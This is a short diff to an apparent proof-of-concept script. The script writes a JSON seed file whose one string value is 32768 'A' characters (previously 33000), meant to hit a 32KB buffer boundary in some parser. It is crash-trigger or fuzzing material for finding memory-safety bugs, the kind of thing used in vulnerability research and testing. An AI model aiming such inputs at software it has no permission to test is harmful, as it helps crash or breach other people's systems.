@@ -3,10 +3,11 @@ import os
 import sys
 
 def generate_poc():
-    print("[*] Generating PoC (33KB flat string)...")
-    # Target size closer to 32768 (buffer size) to trigger off-by-one/boundary read
-    # instead of massive overflow. 33000 is just slightly over 32KB.
-    payload = '{"key": "' + ("A" * 33000) + '"}'
+    print("[*] Generating PoC (Boundary Condition)...")
+    # Buffer size is 32768.
+    # We want to fill it exactly to trigger the boundary check logic.
+    # Payload: 32768 'A's + overhead keys
+    payload = '{"key": "' + ("A" * 32768) + '"}'
     with open("manual_seed.json", "w") as f:
         f.write(payload)
     print(f"    Created manual_seed.json ({len(payload)} bytes)")
